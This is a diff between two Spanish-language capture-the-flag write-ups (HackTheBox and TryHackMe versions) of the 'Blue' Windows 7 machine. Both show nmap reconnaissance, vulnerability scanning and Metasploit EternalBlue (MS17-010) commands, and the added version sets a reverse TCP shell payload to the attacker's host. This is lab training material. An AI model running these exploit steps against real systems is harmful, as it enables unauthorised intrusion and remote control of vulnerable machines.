@@ -17,7 +17,7 @@
   
   
   
-  <link rel="canonical" href="https://d3b0o.github.io/htb/blue/" />
+  <link rel="canonical" href="https://d3b0o.github.io/thm/blue/" />
   
   
   
@@ -63,48 +63,47 @@
   
   
   
-  <meta property="og:title" content="Resolución Máquina Blue (HTB)" />
+  <meta property="og:title" content="Resolución Máquina Blue (THM)" />
 <meta property="og:description" content="Reconocimiento Reconocimiento # Para empezar lo primero es comprobar si la máquina está activa y que OS tiene
-❯ ping -c 1 10.10.10.40 PING 10.10.10.40 (10.10.10.40) 56(84) bytes of data. 64 bytes from 10." />
+❯ ping -c 1 10.10.220.86 PING 10.10.220.86 (10.10.220.86) 56(84) bytes of data. 64 bytes from 10." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://d3b0o.github.io/htb/blue/" /><meta property="og:image" content="https://d3b0o.github.io/htb/blue/cover.png"/><meta property="article:section" content="HTB" />
-<meta property="article:published_time" content="2023-03-13T00:00:00+00:00" />
-<meta property="article:modified_time" content="2023-03-13T00:00:00+00:00" /><meta property="og:site_name" content="d3b0o" />
-<meta property="og:see_also" content="https://d3b0o.github.io/thm/blue/" />
+<meta property="og:url" content="https://d3b0o.github.io/thm/blue/" /><meta property="article:section" content="THM" />
+<meta property="article:published_time" content="2023-03-14T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-03-14T00:00:00+00:00" /><meta property="og:site_name" content="d3b0o" />
+<meta property="og:see_also" content="https://d3b0o.github.io/htb/blue/" />
 
 
-  <meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://d3b0o.github.io/htb/blue/cover.png"/>
-<meta name="twitter:title" content="Resolución Máquina Blue (HTB)"/>
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Resolución Máquina Blue (THM)"/>
 <meta name="twitter:description" content="Reconocimiento Reconocimiento # Para empezar lo primero es comprobar si la máquina está activa y que OS tiene
-❯ ping -c 1 10.10.10.40 PING 10.10.10.40 (10.10.10.40) 56(84) bytes of data. 64 bytes from 10."/>
+❯ ping -c 1 10.10.220.86 PING 10.10.220.86 (10.10.220.86) 56(84) bytes of data. 64 bytes from 10."/>
 
   
   <script type="application/ld+json">
   [{
     "@context": "https://schema.org",
     "@type": "Article",
-    "articleSection": "HackTheBox",
-    "name": "Resolución Máquina Blue (HTB)",
-    "headline": "Resolución Máquina Blue (HTB)",
+    "articleSection": "TryHackMe",
+    "name": "Resolución Máquina Blue (THM)",
+    "headline": "Resolución Máquina Blue (THM)",
     
-    "abstract": "Reconocimiento Reconocimiento # Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.10.40 PING 10.10.10.40 (10.10.10.40) 56(84) bytes of data. 64 bytes from 10.",
+    "abstract": "Reconocimiento Reconocimiento # Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.220.86 PING 10.10.220.86 (10.10.220.86) 56(84) bytes of data. 64 bytes from 10.",
     "inLanguage": "es",
-    "url" : "https:\/\/d3b0o.github.io\/htb\/blue\/",
+    "url" : "https:\/\/d3b0o.github.io\/thm\/blue\/",
     "author" : {
       "@type": "Person",
       "name": "d3b0o"
     },
     "copyrightYear": "2023",
-    "dateCreated": "2023-03-13T00:00:00\u002b00:00",
-    "datePublished": "2023-03-13T00:00:00\u002b00:00",
+    "dateCreated": "2023-03-14T00:00:00\u002b00:00",
+    "datePublished": "2023-03-14T00:00:00\u002b00:00",
     
-    "dateModified": "2023-03-13T00:00:00\u002b00:00",
+    "dateModified": "2023-03-14T00:00:00\u002b00:00",
     
     "keywords": ["# Road to ejpt","CTF","Fácil","Windows","ms17-010","eternalblue","smb"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "716"
+    "wordCount": "796"
   }]
   </script>
 
@@ -586,31 +585,6 @@ if (!doNotTrack) {
       
 
 
-<div id="hero" class="h-[150px] md:h-[200px]"></div>
-
-
-    
-    <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
-    style="background-image:url(/htb/blue/cover_hudefb583dfab34de70e9c4e536f922725_316329_1200x0_resize_box_3.png);">
-    
-
-
-    <div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal">
-    </div>
-    <div
-        class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal">
-    </div>
-</div>
-
-<div id="background-blur" class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div>
-<script>
-    window.addEventListener('scroll', function (e) {
-        var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
-        var background_blur = document.getElementById('background-blur');
-        background_blur.style.opacity = (scroll / 300)
-    });
-</script>
-
     
   
   
@@ -635,8 +609,8 @@ if (!doNotTrack) {
   <li class="inline ">
     <a
       class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
-      href="/htb/"
-      >HackTheBox</a
+      href="/thm/"
+      >TryHackMe</a
     ><span class="px-1 text-primary-500">/</span>
   </li>
 
@@ -644,8 +618,8 @@ if (!doNotTrack) {
   <li class="inline hidden">
     <a
       class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
-      href="/htb/blue/"
-      >Resolución Máquina Blue (HTB)</a
+      href="/thm/blue/"
+      >Resolución Máquina Blue (THM)</a
     ><span class="px-1 text-primary-500">/</span>
   </li>
 
@@ -654,7 +628,7 @@ if (!doNotTrack) {
 
     
     <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-      Resolución Máquina Blue (HTB)
+      Resolución Máquina Blue (THM)
     </h1>
     <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
       
@@ -695,7 +669,7 @@ if (!doNotTrack) {
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2023-03-13 00:00:00 &#43;0000 UTC">13/03/2023</time><span class="px-2 text-primary-500">&middot;</span><span title="Tiempo de lectura">4 mins</span>
+  <time datetime="2023-03-14 00:00:00 &#43;0000 UTC">14/03/2023</time><span class="px-2 text-primary-500">&middot;</span><span title="Tiempo de lectura">4 mins</span>
   
 
   
@@ -727,12 +701,12 @@ if (!doNotTrack) {
   
   
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/htb/&#34;,'_self');">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/thm/&#34;,'_self');">
     <span class="flex">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
   >
-    HTB
+    THM
   </span>
 </span>
 
@@ -894,16 +868,16 @@ if (!doNotTrack) {
     
     <div
         class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
-        Parte 1: Este artículo
+        <a href="https://d3b0o.github.io/htb/blue/">
+            Parte 1: Resolución Máquina Blue (HTB)
+        </a>
     </div>
     
     
     
     <div
         class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
-        <a href="https://d3b0o.github.io/thm/blue/">
-            Parte 2: Resolución Máquina Blue (THM)
-        </a>
+        Parte 2: Este artículo
     </div>
     
     
@@ -919,13 +893,13 @@ if (!doNotTrack) {
             style="text-decoration-line: none !important;" href="#reconocimiento" aria-label="Ancla">#</a></span>        
     
 </h2><p>Para empezar lo primero es comprobar si la máquina está activa y que OS tiene</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">❯ ping -c <span class="m">1</span> 10.10.10.40
-PING 10.10.10.40 <span class="o">(</span>10.10.10.40<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
-<span class="m">64</span> bytes from 10.10.10.40: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">127</span> <span class="nv">time</span><span class="o">=</span><span class="m">332</span> ms
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">❯ ping -c <span class="m">1</span> 10.10.220.86
+PING 10.10.220.86 <span class="o">(</span>10.10.220.86<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+<span class="m">64</span> bytes from 10.10.220.86: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">125</span> <span class="nv">time</span><span class="o">=</span><span class="m">311</span> ms
 
---- 10.10.10.40 ping statistics ---
+--- 10.10.220.86 ping statistics ---
 <span class="m">1</span> packets transmitted, <span class="m">1</span> received, 0% packet loss, <span class="nb">time</span> 0ms
-rtt min/avg/max/mdev <span class="o">=</span> 332.152/332.152/332.152/0.000 ms
+rtt min/avg/max/mdev <span class="o">=</span> 310.739/310.739/310.739/0.000 ms
 </code></pre></div><p>En este caso da un ttl (time to live) de <strong>127</strong>, entendiendo que <strong>ttl=64: Linux</strong> / <strong>ttl=128: Windows</strong>. Esta máquina es <strong>Windows</strong> por aproximación</p>
 <div id="escaneo-de-puertos-nmap" class="anchor">Escaneo de puertos (nmap)></div>
 <h3 class="relative group">Escaneo de puertos (nmap) 
@@ -935,7 +909,7 @@ rtt min/avg/max/mdev <span class="o">=</span> 332.152/332.152/332.152/0.000 ms
             style="text-decoration-line: none !important;" href="#escaneo-de-puertos-nmap" aria-label="Ancla">#</a></span>        
     
 </h3><p>Ahora empezamos con un escaneo de puertos</p>
-<pre tabindex="0"><code>$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.40 -oG allPorts
+<pre tabindex="0"><code>$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.220.86 -oG allPorts
 </code></pre><table>
 <thead>
 <tr>
@@ -985,47 +959,60 @@ rtt min/avg/max/mdev <span class="o">=</span> 332.152/332.152/332.152/0.000 ms
    1   │ 
    2   │ [*] Extracting information...
    3   │ 
-   4   │     [*] IP Address: 10.10.10.40
-   5   │     [*] Open ports: 135,139,445,49152,49153,49154,49155,49156,49157
+   4   │     [*] IP Address: 10.10.220.86
+   5   │     [*] Open ports: 135,139,445,3389,49153,49154,49158,49161
    6   │ 
    7   │ [*] Ports copied to clipboard
    8   │ 
 ───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 </code></pre><p>Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ nmap -p135,139,445,49152,49153,49154,49155,49156,49157 -sC -sV 10.10.10.40-oN versions
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ nmap -p135,139,445,3389,49153,49154,49158,49161 -sC -sV 10.10.220.86 -oN versions
 
-PORT      STATE SERVICE      VERSION
-135/tcp   open  msrpc        Microsoft Windows RPC
-139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
-445/tcp   open  microsoft-ds Windows <span class="m">7</span> Professional <span class="m">7601</span> Service Pack <span class="m">1</span> microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
-49152/tcp open  msrpc        Microsoft Windows RPC
-49153/tcp open  msrpc        Microsoft Windows RPC
-49154/tcp open  msrpc        Microsoft Windows RPC
-49155/tcp open  msrpc        Microsoft Windows RPC
-49156/tcp open  msrpc        Microsoft Windows RPC
-49157/tcp open  msrpc        Microsoft Windows RPC
-Service Info: Host: HARIS-PC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+PORT      STATE SERVICE            VERSION
+135/tcp   open  msrpc              Microsoft Windows RPC
+139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       Windows <span class="m">7</span> Professional <span class="m">7601</span> Service Pack <span class="m">1</span> microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+3389/tcp  open  ssl/ms-wbt-server?
+<span class="p">|</span>_ssl-date: 2023-03-13T21:38:54+00:00<span class="p">;</span> +2s from scanner time.
+<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>Jon-PC
+<span class="p">|</span> Not valid before: 2023-03-12T18:12:17
+<span class="p">|</span>_Not valid after:  2023-09-11T18:12:17
+<span class="p">|</span> rdp-ntlm-info: 
+<span class="p">|</span>   Target_Name: JON-PC
+<span class="p">|</span>   NetBIOS_Domain_Name: JON-PC
+<span class="p">|</span>   NetBIOS_Computer_Name: JON-PC
+<span class="p">|</span>   DNS_Domain_Name: Jon-PC
+<span class="p">|</span>   DNS_Computer_Name: Jon-PC
+<span class="p">|</span>   Product_Version: 6.1.7601
+<span class="p">|</span>_  System_Time: 2023-03-13T21:38:43+00:00
+49153/tcp open  msrpc              Microsoft Windows RPC
+49154/tcp open  msrpc              Microsoft Windows RPC
+49158/tcp open  msrpc              Microsoft Windows RPC
+49161/tcp open  msrpc              Microsoft Windows RPC
+Service Info: Host: JON-PC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
 
 Host script results:
-<span class="p">|</span> smb-os-discovery: 
-<span class="p">|</span>   OS: Windows <span class="m">7</span> Professional <span class="m">7601</span> Service Pack <span class="m">1</span> <span class="o">(</span>Windows <span class="m">7</span> Professional 6.1<span class="o">)</span>
-<span class="p">|</span>   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
-<span class="p">|</span>   Computer name: haris-PC
-<span class="p">|</span>   NetBIOS computer name: HARIS-PC<span class="se">\x</span><span class="m">00</span>
-<span class="p">|</span>   Workgroup: WORKGROUP<span class="se">\x</span><span class="m">00</span>
-<span class="p">|</span>_  System time: 2023-03-13T17:41:08+00:00
-<span class="p">|</span> smb2-time: 
-<span class="p">|</span>   date: 2023-03-13T17:41:09
-<span class="p">|</span>_  start_date: 2023-03-12T19:47:16
-<span class="p">|</span> smb2-security-mode: 
-<span class="p">|</span>   210: 
-<span class="p">|</span>_    Message signing enabled but not required
+<span class="p">|</span>_clock-skew: mean: 1h00m01s, deviation: 2h14m10s, median: 1s
 <span class="p">|</span> smb-security-mode: 
 <span class="p">|</span>   account_used: guest
 <span class="p">|</span>   authentication_level: user
 <span class="p">|</span>   challenge_response: supported
 <span class="p">|</span>_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
-<span class="p">|</span>_clock-skew: mean: 2s, deviation: 1s, median: 1s
+<span class="p">|</span>_nbstat: NetBIOS name: JON-PC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02c0de388f81 <span class="o">(</span>unknown<span class="o">)</span>
+<span class="p">|</span> smb2-security-mode: 
+<span class="p">|</span>   210: 
+<span class="p">|</span>_    Message signing enabled but not required
+<span class="p">|</span> smb2-time: 
+<span class="p">|</span>   date: 2023-03-13T21:38:42
+<span class="p">|</span>_  start_date: 2023-03-13T18:31:03
+<span class="p">|</span> smb-os-discovery: 
+<span class="p">|</span>   OS: Windows <span class="m">7</span> Professional <span class="m">7601</span> Service Pack <span class="m">1</span> <span class="o">(</span>Windows <span class="m">7</span> Professional 6.1<span class="o">)</span>
+<span class="p">|</span>   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+<span class="p">|</span>   Computer name: Jon-PC
+<span class="p">|</span>   NetBIOS computer name: JON-PC<span class="se">\x</span><span class="m">00</span>
+<span class="p">|</span>   Workgroup: WORKGROUP<span class="se">\x</span><span class="m">00</span>
+<span class="p">|</span>_  System time: 2023-03-13T16:38:42-05:00
+
 </code></pre></div><table>
 <thead>
 <tr>
@@ -1058,17 +1045,15 @@ Host script results:
     
 </h2><p>El escaneo de nmap ha reportado que es un windows 7 con un servidor samba</p>
 <p>Con nmap podemos ver si es vulnerable</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">❯ sudo nmap --script smb-vuln* -p139,445 -T4 -Pn 10.10.10.40
-Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-03-13 18:44 CET
-Nmap scan report <span class="k">for</span> 10.10.10.40
-Host is up <span class="o">(</span>0.072s latency<span class="o">)</span>.
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">❯ nmap --script <span class="s2">&#34;vuln and safe&#34;</span> -p445 10.10.220.86
+Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-03-13 22:53 CET
+Nmap scan report <span class="k">for</span> 10.10.220.86
+Host is up <span class="o">(</span>0.37s latency<span class="o">)</span>.
 
 PORT    STATE SERVICE
-139/tcp open  netbios-ssn
 445/tcp open  microsoft-ds
 
 Host script results:
-<span class="p">|</span>_smb-vuln-ms10-054: <span class="nb">false</span>
 <span class="p">|</span> smb-vuln-ms17-010: 
 <span class="p">|</span>   VULNERABLE:
 <span class="p">|</span>   Remote Code Execution vulnerability in Microsoft SMBv1 servers <span class="o">(</span>ms17-010<span class="o">)</span>
@@ -1083,12 +1068,10 @@ Host script results:
 <span class="p">|</span>       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
 <span class="p">|</span>       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
 <span class="p">|</span>_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2017-0143
-<span class="p">|</span>_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
-
-</code></pre></div><p>Es vulnerable. Vamos a usar un exploit de metasploit</p>
+</code></pre></div><p>Es vulnerable. Ahora vamos a usar un exploit de metasploit</p>
 <p>Primero abrimos metasploit</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msfconsole
-</code></pre></div><p>Buscamos exploits para <code>ms17-010</code></p>
+<pre tabindex="0"><code>msfconsole
+</code></pre><p>Buscamos exploits para ms17-010</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msf6 &gt; search ms17-010
 
 Matching <span class="nv">Modules</span>
@@ -1103,25 +1086,32 @@ Matching <span class="nv">Modules</span>
    <span class="m">4</span>  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
 </code></pre></div><p>Vamos a usar el primero</p>
 <pre tabindex="0"><code>use 0
-</code></pre><p>Definimos ip de víctima y atacante</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msf6 exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> &gt; <span class="nb">set</span> RHOST 10.10.10.40
-<span class="nv">RHOST</span> <span class="o">=</span>&gt; 10.10.10.40
-msf6 exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> &gt; <span class="nb">set</span> lhost 10.10.14.27
-<span class="nv">lhost</span> <span class="o">=</span>&gt; 10.10.14.27
-</code></pre></div><p>Lo ejecutamos</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">run
-</code></pre></div><p>Por último para spawnear una shell</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">shell
-</code></pre></div><div id="flags" class="anchor">Flags></div>
+</code></pre><p>Ponemos la ip de la víctima</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msf6 exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> &gt; <span class="nb">set</span> rhost 10.10.220.86
+<span class="nv">rhost</span> <span class="o">=</span>&gt; 10.10.220.86
+</code></pre></div><p>Especificamos la ip y el puerto en el que vamos a estar en escucha</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msf6 exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> &gt; <span class="nb">set</span> lhost 10.2.28.215
+<span class="nv">lhost</span> <span class="o">=</span>&gt; 10.2.28.215
+msf6 exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> &gt; <span class="nb">set</span> lport <span class="m">443</span>
+<span class="nv">lport</span> <span class="o">=</span>&gt; <span class="m">443</span>
+</code></pre></div><p>Cambiamos el payload</p>
+<pre tabindex="0"><code>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/shell/reverse_tcp
+payload =&gt; windows/x64/shell/reverse_tcp
+</code></pre><p>Y por último lo ejecutamos con run</p>
+<pre tabindex="0"><code>run
+</code></pre><p>Ahora ya tenemos una reverse shell.</p>
+<div id="flags" class="anchor">Flags></div>
 <h2 class="relative group">Flags 
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
             style="text-decoration-line: none !important;" href="#flags" aria-label="Ancla">#</a></span>        
     
-</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">type</span> <span class="se">\U</span>sers<span class="se">\h</span>aris<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
-<span class="nb">type</span> <span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.tx
-</code></pre></div>
+</h2><p>Las flags están en:</p>
+<p><code>C:\flag1.txt</code></p>
+<p><code>C:\Windows\System32\config\flag2.txt</code></p>
+<p><code>C:\Users\Jon\Documents\flag3.txt</code></p>
+
         </br></br>
         
 <details style="margin-left:0px" class="mt-2 mb-5 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5">
@@ -1135,16 +1125,16 @@ msf6 exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class=
     
     <div
         class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
-        Parte 1: Este artículo
+        <a href="https://d3b0o.github.io/htb/blue/">
+            Parte 1: Resolución Máquina Blue (HTB)
+        </a>
     </div>
     
     
     
     <div
         class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
-        <a href="https://d3b0o.github.io/thm/blue/">
-            Parte 2: Resolución Máquina Blue (THM)
-        </a>
+        Parte 2: Este artículo
     </div>
     
     
@@ -1154,8 +1144,8 @@ msf6 exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class=
 
       </div>
       <script>
-        var oid = "views_HTB\/Blue\/index.md"
-        var oid_likes = "likes_HTB\/Blue\/index.md"
+        var oid = "views_THM\/Blue\/index.md"
+        var oid_likes = "likes_THM\/Blue\/index.md"
       </script>
       
       
@@ -1182,7 +1172,7 @@ msf6 exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class=
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://d3b0o.github.io/htb/blue/&amp;title=Resoluci%c3%b3n%20M%c3%a1quina%20Blue%20%28HTB%29"
+      href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://d3b0o.github.io/thm/blue/&amp;title=Resoluci%c3%b3n%20M%c3%a1quina%20Blue%20%28THM%29"
       title="Compartir en LinkedIn"
       aria-label="Compartir en LinkedIn"
       >
@@ -1201,7 +1191,7 @@ msf6 exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class=
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://twitter.com/intent/tweet/?url=https://d3b0o.github.io/htb/blue/&amp;text=Resoluci%c3%b3n%20M%c3%a1quina%20Blue%20%28HTB%29"
+      href="https://twitter.com/intent/tweet/?url=https://d3b0o.github.io/thm/blue/&amp;text=Resoluci%c3%b3n%20M%c3%a1quina%20Blue%20%28THM%29"
       title="Tuitear en Twitter"
       aria-label="Tuitear en Twitter"
       >
@@ -1220,7 +1210,7 @@ msf6 exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class=
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://reddit.com/submit/?url=https://d3b0o.github.io/htb/blue/&amp;resubmit=true&amp;title=Resoluci%c3%b3n%20M%c3%a1quina%20Blue%20%28HTB%29"
+      href="https://reddit.com/submit/?url=https://d3b0o.github.io/thm/blue/&amp;resubmit=true&amp;title=Resoluci%c3%b3n%20M%c3%a1quina%20Blue%20%28THM%29"
       title="Publicar en Reddit"
       aria-label="Publicar en Reddit"
       >
@@ -1241,7 +1231,7 @@ msf6 exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class=
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://www.facebook.com/sharer/sharer.php?u=https://d3b0o.github.io/htb/blue/&amp;quote=Resoluci%c3%b3n%20M%c3%a1quina%20Blue%20%28HTB%29"
+      href="https://www.facebook.com/sharer/sharer.php?u=https://d3b0o.github.io/thm/blue/&amp;quote=Resoluci%c3%b3n%20M%c3%a1quina%20Blue%20%28THM%29"
       title="Compartir en Facebook"
       aria-label="Compartir en Facebook"
       >
